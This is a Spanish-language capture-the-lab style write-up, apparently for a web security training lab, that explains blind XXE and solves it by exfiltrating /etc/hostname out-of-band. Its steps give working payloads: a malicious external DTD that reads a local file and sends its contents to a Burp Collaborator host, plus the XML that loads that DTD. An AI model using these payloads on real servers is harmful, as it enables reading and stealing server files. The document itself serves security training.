# 🗄️ XXE ciego con exfiltración vía DTD externa

## 📄 Descripción del laboratorio

Este laboratorio utiliza nuevamente la funcionalidad **Check stock**, que envía un documento **XML** al servidor.

El escenario presenta varias restricciones:

* No existe **reflejo del contenido procesado** en la respuesta → **XXE ciega**.
* Las **entidades externas tradicionales están bloqueadas**.
* No hay **mensajes de error ni feedback visible**.

El objetivo es **exfiltrar el contenido del archivo**:

```
/etc/hostname
```

para ello se utilizará una **DTD externa maliciosa** que forzará al servidor a enviar el contenido hacia un dominio controlado mediante **Burp Collaborator**.



## 📚 Teoría

Cuando una aplicación presenta **XXE ciega** y además:

* bloquea entidades externas tradicionales
* no refleja contenido en la respuesta
* no devuelve errores útiles

la técnica más efectiva consiste en combinar:

* **parameter entities**
* **DTD externa**
* **exfiltración out-of-band (OOB)**

### 📌 Estrategia del ataque

El ataque sigue estos pasos:

1. Se aloja una **DTD externa maliciosa** en un servidor controlado por el atacante (Exploit Server).
2. Dentro de esa DTD se define una entidad que **lee un archivo local del servidor**.
3. Se construye dinámicamente una **URL hacia Burp Collaborator**.
4. El contenido del archivo se incluye como **parámetro en la URL**.
5. El XML principal referencia la **DTD externa**.
6. Cuando el parser XML procesa el documento:
   * descarga la DTD externa
   * lee el archivo local
   * genera una petición HTTP saliente con los datos.

Burp Collaborator captura esa petición y muestra el contenido exfiltrado.

Esta técnica es común en **pentesting real cuando existen filtros agresivos contra XXE**.



## 📝 Práctica

### 🎯 Objetivo

Exfiltrar el contenido de:

```
/etc/hostname
```

mediante una **XXE ciega avanzada con DTD externa**.



### 1️⃣ Confirmar conectividad OOB

Primero confirmamos que el servidor puede realizar conexiones salientes.

Generamos un dominio en **Burp Collaborator**, por ejemplo:

```
abcdef1234.oastify.com
```

Probamos un payload básico:

```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://abcdef1234.oastify.com">
  %remote;
]>
```

Enviamos la petición.

<br>
Después de pulsar **Poll now** en Collaborator aparece una interacción DNS.

<br>
Esto confirma:

* XXE ciega presente
* conectividad saliente disponible



### 2️⃣ Crear la DTD externa maliciosa

Abrimos el **Exploit Server** del laboratorio.

Creamos un nuevo exploit con el siguiente contenido:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://abcdef1234.oastify.com/?file=%file;'>">
%eval;
%exfil;
```

**📌 Qué hace cada parte**

* **%file**

Lee el archivo local:

```
/etc/hostname
```

* **%eval**

Define dinámicamente una nueva **parameter entity** llamada `%exfil`.

* **%exfil**

Fuerza una petición HTTP hacia Burp Collaborator incluyendo el contenido del archivo.

Guardamos el exploit con **Store**.

<img width="768" height="245" alt="image" src="https://github.com/user-attachments/assets/56e44e9e-5743-41dc-ab52-a90ebdc1de58" />



### 3️⃣ Referenciar la DTD externa desde el XML

Volvemos al **Repeater** y modificamos la petición de **Check stock**.

Payload final:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://TU-EXPLOIT-ID.exploit-server.net/exploit">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Enviamos la petición.

<img width="768" height="554" alt="image" src="https://github.com/user-attachments/assets/75aa8faa-5988-4b46-88c8-6fde6723b4aa" />
<br>
La respuesta de la aplicación no cambia, lo cual es esperado en una **XXE ciega**.



### 4️⃣ Recuperar los datos exfiltrados

Abrimos nuevamente **Burp Collaborator** y pulsamos:

```
Poll now
```

Aparece una interacción HTTP similar a:

```http
GET /?file=lab-9f4d1a8c3e HTTP/1.1
Host: abcdef1234.oastify.com
```

<img width="444" height="127" alt="image" src="https://github.com/user-attachments/assets/2c6637b7-413b-47de-b882-7cb140aeefad" />
<br>
El valor del parámetro:

```
file=
```

contiene exactamente el contenido del archivo `/etc/hostname`.

Por ejemplo:

```
lab-9f4d1a8c3e
```



### 5️⃣ Resolver el laboratorio

Copiamos el valor exfiltrado y lo introducimos en el campo de solución del laboratorio.

El laboratorio se marca como completado.



### 6️⃣ Resultado final

Se consigue:

* Explotar una **XXE ciega avanzada**.
* Bypassear filtros de entidades externas.
* Ejecutar una **DTD externa maliciosa**.
* Leer un archivo local del servidor.
* Exfiltrar datos mediante **interacciones out-of-band**.

El laboratorio queda resuelto correctamente.
